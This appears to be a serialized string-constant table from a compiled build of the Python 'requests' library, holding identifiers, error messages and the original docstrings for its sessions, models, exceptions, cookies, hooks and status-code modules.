requests.cookies>Ta__class__Taselfanamea__class__TaselfanameTaselfastateTaselfarequestTaselfaheadersTaselfanameavalueTajaranew_jaracookieTaselfanameadomainapathacookieTaselfanameadomainapathatoReturnacookieTaselfakeyavalTacookie_dictacookiejaraoverwriteanames_from_jaranameTaselfanew_cjTanameavalueakwargsaresultabadargsTajararequestaresponseareqaresTaselfanameadefaultadomainapathTajararequestwrTaselfadomainapathadictionaryacookieTaselfahostaparsedTaselfanameadefaultTaselfTaselfacookieTaselfadomainsacookieTaselfapathsacookieTacookiejaracookiesacookie_in_jarTamorselaexpiresatime_templateTacookiejaranameadomainapathaclearablesacookieTaselfanameavalueakwargswcTaselfacookieaargsakwargsa__class__Taselfaotheracookiea__class__.requests.exceptions}baresponseapopTarequestnarequesta__class__a__init__uInitialize RequestException with `request` and `response` objects.aCompatJSONDecodeErroraInvalidJSONErroraargsu
        Construct the JSONDecodeError instance first with all
        args. Then use it's args to construct the IOError so that
        the json specific args aren't used as IOError specific args
        and the error message from JSONDecodeError is preserved.
        a__reduce__u
        The __reduce__ method called when pickling the object must
        be the one from the JSONDecodeError (be it json/simplejson)
        as it expects all the arguments for instantiation, not just
        one like the IOError, and the MRO would by default call the
        __reduce__ method from the IOError due to the inheritance order.
        u
requests.exceptions
~~~~~~~~~~~~~~~~~~~

This module contains the set of Requests' exceptions.
a__doc__a__file__a__spec__aoriginahas_locationa__cached__uurllib3.exceptionsTaHTTPErrorlaHTTPErroraBaseHTTPErroracompatTaJSONDecodeErrorlaJSONDecodeErrorTEOSErrora__prepare__aRequestExceptiona__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>urequests.exceptionsa__module__uThere was an ambiguous exception that occurred while handling your
    request.
    a__qualname__uRequestException.__init__a__orig_bases__uA JSON error occurred.uCouldn't decode the text into jsonuJSONDecodeError.__init__uJSONDecodeError.__reduce__uAn HTTP error occurred.aConnectionErroruA Connection error occurred.aProxyErroruA proxy error occurred.aSSLErroruAn SSL error occurred.aTimeoutuThe request timed out.

    Catching this error will catch both
    :exc:`~requests.exceptions.ConnectTimeout` and
    :exc:`~requests.exceptions.ReadTimeout` errors.
    aConnectTimeoutuThe request timed out while trying to connect to the remote server.

    Requests that produced this error are safe to retry.
    aReadTimeoutuThe server did not send any data in the allotted amount of time.aURLRequireduA valid URL is required to make a request.aTooManyRedirectsuToo many redirects.aMissingSchemauThe URL scheme (e.g. http or https) is missing.aInvalidSchemauThe URL scheme provided is either invalid or unsupported.aInvalidURLuThe URL provided was somehow invalid.aInvalidHeaderuThe header value provided was somehow invalid.aInvalidProxyURLuThe proxy URL provided is invalid.aChunkedEncodingErroruThe server declared chunked encoding but sent an invalid chunk.aContentDecodingErroruFailed to decode response content.aStreamConsumedErroruThe content for this response was already consumed.aRetryErroruCustom retries logic failedaUnrewindableBodyErroruRequests encountered an error when trying to rewind a body.aWarningaRequestsWarninguBase warning for Requests.aDeprecationWarningaFileModeWarninguA file was opened in text mode, but Requests determined its binary length.aRequestsDependencyWarninguAn imported dependency doesn't match the expected version range.urequests\exceptions.pyu<module requests.exceptions>Ta__class__TaselfaargsakwargsTaselfaargsakwargsaresponsea__class__Taselfu.requests.hooksaHOOKSageta__call__ahook_datauDispatches a hook dictionary on a given piece of data.u
requests.hooks
~~~~~~~~~~~~~~

This module provides the capabilities for the Requests hooks system.

Available hooks:

``response``:
    The response generated from a Request.
a__doc__a__file__a__spec__aoriginahas_locationa__cached__aresponseadefault_hooksadispatch_hookurequests\hooks.pyu<module requests.hooks>Takeyahooksahook_dataakwargsahooka_hook_datau.requests.modelsy6aurlsplitaurlapathw/aqueryw?uuBuild the path URL to use.TOstrObytesareada__iter__ato_key_val_listutoo many values to unpack (expected 2)abasestringaresultwkaencodeTuutf-8aurlencodeDadoseqtuEncode parameters in a piece of data.

        Will successfully encode parameters when passed as a dict or a list of
        2-tuples. Order is retained if data is a list of 2-tuples but arbitrary
        if parameters are supplied as a dict.
        uFiles must be provided.uData must not be a string.anew_fieldsafieldadecodeTOtupleOlistutoo many values to unpack (expected 3)utoo many values to unpack (expected 4)aguess_filenameTOstrObytesObytearrayaRequestFieldTanameadataafilenameaheadersamake_multipartTacontent_typeaencode_multipart_formdatauBuild the body for a multipart/form-data request.

        Will successfully encode files when passed as a dict or a list of
        tuples. Order is retained if data is a list of tuples but arbitrary
        if parameters are supplied as a dict.
        The tuples may be 2-tuples (filename, fileobj), 3-tuples (filename, fileobj, contentype)
        or 4-tuples (filename, fileobj, contentype, custom_headers).
        ahooksuUnsupported event specified, with event name "w"aCallableaappendaextenduProperly register a hook.u<genexpr>uRequestHooksMixin.register_hook.<locals>.<genexpr>aremoveuDeregister a previously registered hook.
        Returns True if the hook existed, False if not.
        adefault_hooksaitemsaselfaregister_hookTaeventahookamethodaheadersafilesadataajsonaparamsaauthacookiesu<Request [u]>aPreparedRequestaprepareT
amethodaurlaheadersafilesadataajsonaparamsaauthacookiesahooksuConstructs a :class:`PreparedRequest <PreparedRequest>` for transmission and returns it.a_cookiesabodya_body_positionaprepare_methodaprepare_urlaprepare_headersaprepare_cookiesaprepare_bodyaprepare_authaprepare_hooksuPrepares the entire request with the given parameters.u<PreparedRequest [acopya_copy_cookie_jarato_native_stringaupperuPrepares the given HTTP method.aidnalDauts46taIDNAErrorTautf8alstripw:alowerastartswithTahttpaparse_urlutoo many values to unpack (expected 7)aLocationParseErroraInvalidURLaargsaMissingSchemauInvalid URL u: No scheme supplied. Perhaps you meant https://u: No host suppliedaunicode_is_asciia_get_idna_encoded_hostTuURL has an invalid label.TTw*w.w@ahosta_encode_paramsw&arequote_uriaurlunparseuPrepares the given HTTP URL.aCaseInsensitiveDictacheck_header_validityuPrepares the given HTTP headers.uapplication/jsonacomplexjsonadumpsDaallow_nanFaInvalidJSONErrorTarequestaMappingasuper_lenaUnsupportedOperationatelluStreamed bodies and files are mutually exclusive.abuiltin_struContent-LengthachunkeduTransfer-Encodinga_encode_filesuapplication/x-www-form-urlencodedaprepare_content_lengthucontent-typeuContent-TypeuPrepares the given HTTP body data.TaGETaHEADagetTuContent-Lengthw0uPrepare Content-Length header based on request method and bodyaget_auth_from_urlaHTTPBasicAuthaupdateuPrepares the given HTTP auth data.acookielibaCookieJaracookiejar_from_dictaget_cookie_headeraCookieuPrepares the given HTTP cookie data.

        This function eventually generates a ``Cookie`` header from the
        given cookies using cookielib. Due to cookielib's design, the header
        will not be regenerated if it already exists, meaning this function
        can only be called once for the life of the
        :class:`PreparedRequest <PreparedRequest>` object. Any subsequent calls
        to ``prepare_cookies`` will have no actual effect, unless the "Cookie"
        header is removed beforehand.
        uPrepares the given hooks.a_contenta_content_consumeda_nextastatus_codearawaencodingahistoryareasonadatetimeatimedeltaTlaelapsedarequestacloseacontenta__attrs__u<Response [aokuReturns True if :attr:`status_code` is less than 400.

        This attribute checks if the status code of the response is between
        400 and 600 to see if there was a client error or a server error. If
        the status code, is between 200 and 400, this will return True. This
        is **not** a check to see if the response code is ``200 OK``.
        aiter_contentTluAllows you to use a response as an iterator.araise_for_statusaHTTPErroruReturns True if :attr:`status_code` is less than 400, False if not.

        This attribute checks if the status code of the response is between
        400 and 600 to see if there was a client error or a server error. If
        the status code is between 200 and 400, this will return True. This
        is **not** a check to see if the response code is ``200 OK``.
        alocationaREDIRECT_STATIuTrue if this Response is a well-formed HTTP redirect that could have
        been processed automatically (by :meth:`Session.resolve_redirects`).
        acodesamoved_permanentlyapermanent_redirectuTrue if this Response one of the permanent versions of redirect.uReturns a PreparedRequest for the next request in a redirect chain, if there is one.achardetadetectuutf-8uThe apparent encoding, provided by the charset_normalizer or chardet libraries.agenerateuResponse.iter_content.<locals>.generateaStreamConsumedErroruchunk_size must be an int, it is instead a w.aiter_slicesastream_decode_response_unicodeuIterates over the response data.  When stream=True is set on the
        request, this avoids reading the content at once into memory for
        large responses.  The chunk size is the number of bytes it should
        read into memory.  This is not necessarily the length of each item
        returned as decoding can take place.

        chunk_size must be of type int or None. A value of None will
        function differently depending on the value of `stream`.
        stream=True will read data as it arrives in whatever size the
        chunks are received. If stream=False, data is returned as
        a single chunk.

        If decode_unicode is True, content will be decoded using the best
        available encoding based on the response.
        astreamachunk_sizeDadecode_contenttaProtocolErroraChunkedEncodingErroraDecodeErroraContentDecodingErroraReadTimeoutErroraConnectionErroraSSLErroraRequestsSSLErroruIterates over the response data, one line at a time.  When
        stream=True is set on the request, this avoids reading the
        content at once into memory for large responses.

        .. note:: This method is not reentrant safe.
        adecode_unicodeTachunk_sizeadecode_unicodeapendingadelimiterasplitasplitlinesqachunkapopaiter_linesuResponse.iter_linesuThe content for this response was already consumedcaCONTENT_CHUNK_SIZEuContent of the response, in bytes.aapparent_encodingareplaceTELookupErrorETypeErroruContent of the response, in unicode.

        If Response.encoding is None, encoding will be guessed using
        ``charset_normalizer`` or ``chardet``.

        The encoding of the response content is determined based solely on HTTP
        headers, following RFC 2616 to the letter. If you can take advantage of
        non-HTTP knowledge to make a better guess at the encoding, you should
        set ``r.encoding`` appropriately before accessing this property.
        aguess_json_utfaloadsaJSONDecodeErroraRequestsJSONDecodeErroramsgadocaposatextuReturns the json-encoded content of a response, if any.

        :param \*\*kwargs: Optional arguments that ``json.loads`` takes.
        :raises requests.exceptions.JSONDecodeError: If the response body does not
            contain valid json.
        Talinkaparse_header_linksTarelTaurlaresolved_linksuReturns the parsed header links of the response, if any.Tuiso-8859-1llu Client Error: u for url: lu Server Error: TaresponseuRaises :class:`HTTPError`, if one occurred.arelease_connuReleases the connection back to the pool. Once this method has been
        called the underlying ``raw`` object must not be accessed again.

        *Note: Should not normally need to be called explicitly.*
        u
requests.models
~~~~~~~~~~~~~~~

This module contains the primary objects that power Requests.
a__doc__a__file__a__spec__aoriginahas_locationa__cached__uencodings.idnaaencodingsuurllib3.exceptionsTaDecodeErroraLocationParseErroraProtocolErroraReadTimeoutErroraSSLErroruurllib3.fieldsTaRequestFielduurllib3.filepostTaencode_multipart_formdatauurllib3.utilTaparse_urla_internal_utilsTato_native_stringaunicode_is_asciilTaHTTPBasicAuthacompatTaCallableaJSONDecodeErroraMappingabasestringabuiltin_strachardetacookielibTajsonTaurlencodeaurlsplitaurlunparseTa_copy_cookie_jaracookiejar_from_dictaget_cookie_headeraexceptionsTaChunkedEncodingErroraConnectionErroraContentDecodingErroraHTTPErroraInvalidJSONErroraInvalidURLTaJSONDecodeErrorTaMissingSchemaTaSSLErrorTaStreamConsumedErrorTadefault_hooksastatus_codesTacodesastructuresTaCaseInsensitiveDictautilsT
acheck_header_validityaget_auth_from_urlaguess_filenameaguess_json_utfaiter_slicesaparse_header_linksarequote_uriastream_decode_response_unicodeasuper_lenato_key_val_listamovedafoundaotheratemporary_redirectlaDEFAULT_REDIRECT_LIMITlPlaITER_CHUNK_SIZEurequests.modelsa__module__aRequestEncodingMixina__qualname__apath_urluRequestEncodingMixin.path_urluRequestEncodingMixin._encode_paramsuRequestEncodingMixin._encode_filesaRequestHooksMixinuRequestHooksMixin.register_hookaderegister_hookuRequestHooksMixin.deregister_hooka__prepare__aRequesta__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>uA user-created :class:`Request <Request>` object.

    Used to prepare a :class:`PreparedRequest <PreparedRequest>`, which is sent to the server.

    :param method: HTTP method to use.
    :param url: URL to send.
    :param headers: dictionary of headers to send.
    :param files: dictionary of {filename: fileobject} files to multipart upload.
    :param data: the body to attach to the request. If a dictionary or
        list of tuples ``[(key, value)]`` is provided, form-encoding will
        take place.
    :param json: json for the body to attach to the request (if files or data is not specified).
    :param params: URL parameters to append to the URL. If a dictionary or
        list of tuples ``[(key, value)]`` is provided, form-encoding will
        take place.
    :param auth: Auth handler or (user, pass) tuple.
    :param cookies: dictionary or CookieJar of cookies to attach to this request.
    :param hooks: dictionary of callback hooks, for internal usage.

    Usage::

      >>> import requests
      >>> req = requests.Request('GET', 'https://httpbin.org/get')
      >>> req.prepare()
      <PreparedRequest [GET]>
    T
nnnnnnnnnna__init__uRequest.__init__a__repr__uRequest.__repr__uRequest.preparea__orig_bases__uThe fully mutable :class:`PreparedRequest <PreparedRequest>` object,
    containing the exact bytes that will be sent to the server.

    Instances are generated from a :class:`Request <Request>` object, and
    should not be instantiated manually; doing so may produce undesirable
    effects.

    Usage::

      >>> import requests
      >>> req = requests.Request('GET', 'https://httpbin.org/get')
      >>> r = req.prepare()
      >>> r
      <PreparedRequest [GET]>

      >>> s = requests.Session()
      >>> s.send(r)
      <Response [200]>
    uPreparedRequest.__init__uPreparedRequest.prepareuPreparedRequest.__repr__uPreparedRequest.copyuPreparedRequest.prepare_methodastaticmethoduPreparedRequest._get_idna_encoded_hostuPreparedRequest.prepare_urluPreparedRequest.prepare_headersTnuPreparedRequest.prepare_bodyuPreparedRequest.prepare_content_lengthTuuPreparedRequest.prepare_authuPreparedRequest.prepare_cookiesuPreparedRequest.prepare_hooksuThe :class:`Response <Response>` object, which contains a
    server's response to an HTTP request.
    aResponseL
a_contentastatus_codeaheadersaurlahistoryaencodingareasonacookiesaelapsedarequestuResponse.__init__a__enter__uResponse.__enter__a__exit__uResponse.__exit__a__getstate__uResponse.__getstate__a__setstate__uResponse.__setstate__uResponse.__repr__a__bool__uResponse.__bool__a__nonzero__uResponse.__nonzero__uResponse.__iter__uResponse.okais_redirectuResponse.is_redirectais_permanent_redirectuResponse.is_permanent_redirectanextuResponse.nextuResponse.apparent_encodingTlFuResponse.iter_contentuResponse.contentuResponse.textuResponse.jsonalinksuResponse.linksuResponse.raise_for_statusuResponse.closeurequests\models.pyTa.0whu<module requests.models>Ta__class__TaselfTaselfaargsT
aselfamethodaurlaheadersafilesadataaparamsaauthacookiesahooksajsonwkwvTaselfastateanameavalueTafilesadataanew_fieldsafieldsafieldavalwvwkaftafhafnafpafdataarfabodyacontent_typeTadataaresultwkavswvTahostaidnaTaselfarelease_connTaselfwpTaselfaeventahookTweachunkaselfachunk_sizeTachunk_sizeaselfTaselfachunk_sizeadecode_unicodeagenerateareused_chunksastream_chunksachunksTaselfachunk_sizeadecode_unicodeadelimiterapendingachunkalinesTaselfakwargsaencodingweTaselfaheaderaresolved_linksalinksalinkakeyTaselfaurlwpapathaqueryTaselfamethodaurlaheadersafilesadataaparamsaauthacookiesahooksajsonTaselfaauthaurlaurl_authwrTaselfadataafilesajsonabodyacontent_typeaveais_streamalengthTaselfabodyalengthTaselfacookiesacookie_headerTaselfaheadersaheaderanameavalueTaselfahooksaeventTaselfamethodT
aselfaurlaparamsaschemeaauthahostaportapathaqueryafragmentweanetlocaenc_paramsTaselfahttp_error_msgareasonTaselfacontentaencoding.requests.packagesa__doc__a__file__a__spec__aoriginahas_locationa__cached__asysacompatTachardetlachardetlTaurllib3aidnaapackageamodulesamodastartswithuw.urequests.packages.a__name__atargetaimported_modareplaceurequests\packages.pyu<module requests.packages>.requests.sessions32aMappingato_key_val_listaupdateaitemsutoo many values to unpack (expected 2)uDetermines appropriate setting for a given request, taking into account
    the explicit setting on that request, and the setting in the session. If a
    setting is a dictionary, they will be merged together using `dict_class`
    agetTaresponseamerge_settinguProperly merges both requests and session hooks.

    This is necessary because when request_hooks == {'response': []}, the
    merge breaks Session hooks entirely.
    ais_redirectaheadersalocationaencodeTalatin1ato_native_stringautf8uReceives a Response. Returns a redirect URI or ``None``aurlparseahostnameaschemeahttpaportTlPnahttpsTlnaDEFAULT_PORTSuDecide whether Authorization header should be removed when redirectinguReceives a Response. Returns a generator of Responses or Requests.aselfaget_redirect_targetarespareqaurlafragmentacopyahist:lnnahistoryacontentaChunkedEncodingErroraContentDecodingErrorarawareadTFTadecode_contentamax_redirectsaTooManyRedirectsuExceeded uu redirects.acloseastartswithTu//w:aprevious_fragmenta_replaceTafragmentaparsedageturlanetlocaurljoinarequote_uriarebuild_methodastatus_codeacodesatemporary_redirectapermanent_redirectTuContent-LengthuContent-TypeuTransfer-Encodingaprepared_requestapopabodyTaCookienaextract_cookies_to_jara_cookiesamerge_cookiesacookiesaprepare_cookiesarebuild_proxiesaproxiesarebuild_autha_body_positionuContent-LengthuTransfer-Encodingarewind_bodyayield_requestsasendastreamatimeoutaverifyacertaallow_redirectsaadapter_kwargsaresolve_redirectsuSessionRedirectMixin.resolve_redirectsaAuthorizationashould_strip_autharequestatrust_envaget_netrc_authaprepare_authuWhen being redirected we may want to strip authentication from the
        request to avoid leaking credentials. This method intelligently removes
        and reapplies authentication where possible to avoid credential loss.
        aresolve_proxiesuProxy-Authorizationaget_auth_from_urlTnnTahttpsa_basic_auth_struThis method re-evaluates the proxy configuration by considering the
        environment variables. If we are redirected to a URL covered by
        NO_PROXY, we strip the proxy configuration. Otherwise, we set missing
        proxy keys for this URL (in case they were stripped by a previous
        redirect).

        This method also replaces the Proxy-Authorization header where
        necessary.

        :rtype: dict
        amethodasee_otheraHEADaGETafoundamovedaPOSTuWhen being redirected we may want to change the method of the request
        based on certain specs or browser behavior.
        adefault_headersaauthadefault_hooksahooksaparamsaDEFAULT_REDIRECT_LIMITacookiejar_from_dictaOrderedDictaadaptersamountuhttps://aHTTPAdapteruhttp://acookielibaCookieJaraRequestsCookieJaraPreparedRequestaprepareaupperafilesadataajsonaCaseInsensitiveDictTadict_classamerge_hooksT
amethodaurlafilesadataajsonaheadersaparamsaauthacookiesahooksuConstructs a :class:`PreparedRequest <PreparedRequest>` for
        transmission and returns it. The :class:`PreparedRequest` has settings
        merged from the :class:`Request <Request>` instance and those of the
        :class:`Session`.

        :param request: :class:`Request` instance to prepare with this
            session's settings.
        :rtype: requests.PreparedRequest
        aRequestT
amethodaurlaheadersafilesadataajsonaparamsaauthacookiesahooksaprepare_requestamerge_environment_settingsuConstructs a :class:`Request <Request>`, prepares it and sends it.
        Returns :class:`Response <Response>` object.

        :param method: method for the new :class:`Request` object.
        :param url: URL for the new :class:`Request` object.
        :param params: (optional) Dictionary or bytes to be sent in the query
            string for the :class:`Request`.
        :param data: (optional) Dictionary, list of tuples, bytes, or file-like
            object to send in the body of the :class:`Request`.
        :param json: (optional) json to send in the body of the
            :class:`Request`.
        :param headers: (optional) Dictionary of HTTP Headers to send with the
            :class:`Request`.
        :param cookies: (optional) Dict or CookieJar object to send with the
            :class:`Request`.
        :param files: (optional) Dictionary of ``'filename': file-like-objects``
            for multipart encoding upload.
        :param auth: (optional) Auth tuple or callable to enable
            Basic/Digest/Custom HTTP Auth.
        :param timeout: (optional) How long to wait for the server to send
            data before giving up, as a float, or a :ref:`(connect timeout,
            read timeout) <timeouts>` tuple.
        :type timeout: float or tuple
        :param allow_redirects: (optional) Set to True by default.
        :type allow_redirects: bool
        :param proxies: (optional) Dictionary mapping protocol or protocol and
            hostname to the URL of the proxy.
        :param hooks: (optional) Dictionary mapping hook name to one event or
            list of events, event must be callable.
        :param stream: (optional) whether to immediately download the response
            content. Defaults to ``False``.
        :param verify: (optional) Either a boolean, in which case it controls whether we verify
            the server's TLS certificate, or a string, in which case it must be a path
            to a CA bundle to use. Defaults to ``True``. When set to
            ``False``, requests will accept any TLS certificate presented by
            the server, and will ignore hostname mismatches and/or expired
            certificates, which will make your application vulnerable to
            man-in-the-middle (MitM) attacks. Setting verify to ``False``
            may be useful during local development or testing.
        :param cert: (optional) if String, path to ssl client cert file (.pem).
            If Tuple, ('cert', 'key') pair.
        :rtype: requests.Response
        uSends a GET request. Returns :class:`Response` object.

        :param url: URL for the new :class:`Request` object.
        :param \*\*kwargs: Optional arguments that ``request`` takes.
        :rtype: requests.Response
        aOPTIONSuSends a OPTIONS request. Returns :class:`Response` object.

        :param url: URL for the new :class:`Request` object.
        :param \*\*kwargs: Optional arguments that ``request`` takes.
        :rtype: requests.Response
        uSends a HEAD request. Returns :class:`Response` object.

        :param url: URL for the new :class:`Request` object.
        :param \*\*kwargs: Optional arguments that ``request`` takes.
        :rtype: requests.Response
        uSends a POST request. Returns :class:`Response` object.

        :param url: URL for the new :class:`Request` object.
        :param data: (optional) Dictionary, list of tuples, bytes, or file-like
            object to send in the body of the :class:`Request`.
        :param json: (optional) json to send in the body of the :class:`Request`.
        :param \*\*kwargs: Optional arguments that ``request`` takes.
        :rtype: requests.Response
        aPUTuSends a PUT request. Returns :class:`Response` object.

        :param url: URL for the new :class:`Request` object.
        :param data: (optional) Dictionary, list of tuples, bytes, or file-like
            object to send in the body of the :class:`Request`.
        :param \*\*kwargs: Optional arguments that ``request`` takes.
        :rtype: requests.Response
        aPATCHuSends a PATCH request. Returns :class:`Response` object.

        :param url: URL for the new :class:`Request` object.
        :param data: (optional) Dictionary, list of tuples, bytes, or file-like
            object to send in the body of the :class:`Request`.
        :param \*\*kwargs: Optional arguments that ``request`` takes.
        :rtype: requests.Response
        aDELETEuSends a DELETE request. Returns :class:`Response` object.

        :param url: URL for the new :class:`Request` object.
        :param \*\*kwargs: Optional arguments that ``request`` takes.
        :rtype: requests.Response
        asetdefaultuYou can only send PreparedRequests.Taallow_redirectstTastreamaget_adapterTaurlapreferred_clockatimedeltaTasecondsaelapsedadispatch_hookaresponseainsertlwrDayield_requeststa_nextuSend a given PreparedRequest.

        :rtype: requests.Response
        Tano_proxyaget_environ_proxiesaenvironTaREQUESTS_CA_BUNDLETaCURL_CA_BUNDLEu
        Check the environment and merge it with some settings.

        :rtype: dict
        aloweraInvalidSchemauNo connection adapters were found for u
        Returns the appropriate connection adapter for the given URL.

        :rtype: requests.adapters.BaseAdapter
        avaluesuCloses all adapters and as such the sessionuRegisters a connection adapter to a prefix.

        Adapters are sorted in descending order by prefix length.
        a__attrs__aSessionu
    Returns a :class:`Session` for context-management.

    .. deprecated:: 1.0.0

        This method has been deprecated since version 1.0.0 and is only kept for
        backwards compatibility. New code should use :class:`~requests.sessions.Session`
        to create a session. This may be removed at a future date.

    :rtype: Session
    u
requests.sessions
~~~~~~~~~~~~~~~~~

This module provides a Session object to manage and persist settings across
requests (cookies, auth, proxies).
a__doc__a__file__a__spec__aoriginahas_locationa__cached__aosasysatimeacollectionsTaOrderedDictadatetimeTatimedeltaa_internal_utilsTato_native_stringlTaHTTPAdapterTa_basic_auth_stracompatTaMappingacookielibaurljoinaurlparseTaRequestsCookieJaracookiejar_from_dictaextract_cookies_to_jaramerge_cookiesaexceptionsTaChunkedEncodingErroraContentDecodingErroraInvalidSchemaaTooManyRedirectsTadefault_hooksadispatch_hookamodelsTaDEFAULT_REDIRECT_LIMITaREDIRECT_STATIaPreparedRequestaRequestaREDIRECT_STATIastatus_codesTacodesastructuresTaCaseInsensitiveDictautilsT
aDEFAULT_PORTSadefault_headersaget_auth_from_urlaget_environ_proxiesaget_netrc_autharequote_uriaresolve_proxiesarewind_bodyashould_bypass_proxiesato_key_val_listashould_bypass_proxiesaperf_counterurequests.sessionsa__module__aSessionRedirectMixina__qualname__uSessionRedirectMixin.get_redirect_targetuSessionRedirectMixin.should_strip_authTFntnnFuSessionRedirectMixin.rebuild_authuSessionRedirectMixin.rebuild_proxiesuSessionRedirectMixin.rebuild_methoda__prepare__a__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>uA Requests session.

    Provides cookie persistence, connection-pooling, and configuration.

    Basic Usage::

      >>> import requests
      >>> s = requests.Session()
      >>> s.get('https://httpbin.org/get')
      <Response [200]>

    Or as a context manager::

      >>> with requests.Session() as s:
      ...     s.get('https://httpbin.org/get')
      <Response [200]>
    Laheadersacookiesaauthaproxiesahooksaparamsaverifyacertaadaptersastreamatrust_envamax_redirectsa__init__uSession.__init__a__enter__uSession.__enter__a__exit__uSession.__exit__uSession.prepare_requestTnnnnnnntnnnnnnuSession.requestuSession.getaoptionsuSession.optionsaheaduSession.headapostuSession.postTnaputuSession.putapatchuSession.patchadeleteuSession.deleteuSession.senduSession.merge_environment_settingsuSession.get_adapteruSession.closeuSession.mounta__getstate__uSession.__getstate__a__setstate__uSession.__setstate__a__orig_bases__asessionurequests\sessions.pyu<module requests.sessions>Ta__class__TaselfTaselfaargsTaselfastateTaselfastateaattravalueTaselfwvTaselfaurlakwargsTaselfaurlaprefixaadapterTaselfarespalocationT
aselfaurlaproxiesastreamaverifyacertano_proxyaenv_proxieswkwvTarequest_hooksasession_hooksadict_classTarequest_settingasession_settingadict_classamerged_settinganone_keysakeyTaselfaprefixaadapterakeys_to_moveakeyTaselfaurladataakwargsTaselfaurladataajsonakwargsTaselfarequestacookiesamerged_cookiesaauthwpTaselfaprepared_requestaresponseaheadersaurlanew_authTaselfaprepared_requestaresponseamethodTaselfaprepared_requestaproxiesaheadersaschemeanew_proxiesausernameapasswordTaselfamethodaurlaparamsadataaheadersacookiesafilesaauthatimeoutaallow_redirectsaproxiesahooksastreamaverifyacertajsonareqaprepasettingsasend_kwargsarespTaselfarespareqastreamatimeoutaverifyacertaproxiesayield_requestsaadapter_kwargsahistaurlaprevious_fragmentaprepared_requestaparsed_rurlaparsedapurged_headersaheaderaheadersarewindableT
aselfarequestakwargsaallow_redirectsastreamahooksaadapterastartwraelapsedarespagenahistoryTaselfaold_urlanew_urlaold_parsedanew_parsedachanged_portachanged_schemeadefault_port.requests.status_codes(a_codesaitemsutoo many values to unpack (expected 2)acodesastartswithTTw\w/aupperadocu_init.<locals>.doca__doc__w
asortedu, u* %d: %su``uu<genexpr>u_init.<locals>.doc.<locals>.<genexpr>u_init.<locals>.<genexpr>u
The ``codes`` object defines a mapping from common names for HTTP statuses
to their numerical codes, accessible either as attributes or as dictionary
items.

Example::

    >>> import requests
    >>> requests.codes['temporary_redirect']
    307
    >>> requests.codes.teapot
    418
    >>> requests.codes['\o/']
    200

Some codes have multiple names, and both upper- and lower-case versions of
the names are allowed. For example, ``codes.ok``, ``codes.OK``, and
``codes.okay`` all correspond to the HTTP status code 200.
a__file__a__spec__aoriginahas_locationa__cached__astructuresTaLookupDictlaLookupDictlDDldlelflglzlllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllTacontinueTaswitching_protocolsTaprocessinguearly-hintsTacheckpointTauri_too_longarequest_uri_too_longTaokaokayaall_okaall_okayaall_goodu\o/u✓TacreatedTaacceptedTanon_authoritative_infoanon_authoritative_informationTano_contentTareset_contentaresetTapartial_contentapartialTamulti_statusamultiple_statusamulti_statiamultiple_statiTaalready_reportedTaim_usedTamultiple_choicesTamoved_permanentlyamovedu\o-TafoundTasee_otheraotherTanot_modifiedTause_proxyTaswitch_proxyTatemporary_redirectatemporary_movedatemporaryTapermanent_redirectaresume_incompletearesumeTabad_requestabadTaunauthorizedTapayment_requiredapaymentTaforbiddenTanot_foundu-o-Tamethod_not_allowedanot_allowedTanot_acceptableTaproxy_authentication_requiredaproxy_authaproxy_authenticationTarequest_timeoutatimeoutTaconflictTagoneTalength_requiredTaprecondition_failedapreconditionTarequest_entity_too_largeacontent_too_largeTarequest_uri_too_largeauri_too_longTaunsupported_media_typeaunsupported_mediaamedia_typeTarequested_range_not_satisfiablearequested_rangearange_not_satisfiableTaexpectation_failedTaim_a_teapotateapotai_am_a_teapotTamisdirected_requestTaunprocessable_entityaunprocessableaunprocessable_contentTalockedTafailed_dependencyadependencyTaunordered_collectionaunorderedatoo_earlyTaupgrade_requiredaupgradeTaprecondition_requiredapreconditionTatoo_many_requestsatoo_manyTaheader_fields_too_largeafields_too_largeTano_responseanoneTaretry_witharetryTablocked_by_windows_parental_controlsaparental_controlsTaunavailable_for_legal_reasonsalegal_reasonsTaclient_closed_requestTainternal_server_erroraserver_erroru/o\u✗Tanot_implementedTabad_gatewayTaservice_unavailableaunavailableTagateway_timeoutTahttp_version_not_supportedahttp_versionTavariant_also_negotiatesTainsufficient_storageTabandwidth_limit_exceededabandwidthTanot_extendedTanetwork_authentication_requiredanetwork_authanetwork_authenticationTastatus_codesTanamea_initurequests\status_codes.pyTa.0acodeadocTa.0wnu<module requests.status_codes>TacodeatitlesatitleadocTacodeanames.requests.structuresRaOrderedDicta_storeaupdatealowerlavaluesutoo many values to unpack (expected 2)u<genexpr>uCaseInsensitiveDict.__iter__.<locals>.<genexpr>aitemsuLike iteritems(), but with all lowercase keys.uCaseInsensitiveDict.lower_items.<locals>.<genexpr>aMappingaCaseInsensitiveDictalower_itemsanamea__class__a__init__u<lookup 'uu'>agetu
requests.structures
~~~~~~~~~~~~~~~~~~~

Data structures that power Requests.
a__doc__a__file__a__spec__aoriginahas_locationa__cached__acollectionsTaOrderedDictlacompatTaMappingaMutableMappingaMutableMappinga__prepare__a__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>urequests.structuresa__module__uA case-insensitive ``dict``-like object.

    Implements all methods and operations of
    ``MutableMapping`` as well as dict's ``copy``. Also
    provides ``lower_items``.

    All keys are expected to be strings. The structure remembers the
    case of the last key to be set, and ``iter(instance)``,
    ``keys()``, ``items()``, ``iterkeys()``, and ``iteritems()``
    will contain case-sensitive keys. However, querying and contains
    testing is case insensitive::

        cid = CaseInsensitiveDict()
        cid['Accept'] = 'application/json'
        cid['aCCEPT'] == 'application/json'  # True
        list(cid) == ['Accept']  # True

    For example, ``headers['content-encoding']`` will return the
    value of a ``'Content-Encoding'`` response header, regardless
    of how the header name was originally stored.

    If the constructor, ``.update``, or equality comparison
    operations are given keys that have equal ``.lower()``s, the
    behavior is undefined.
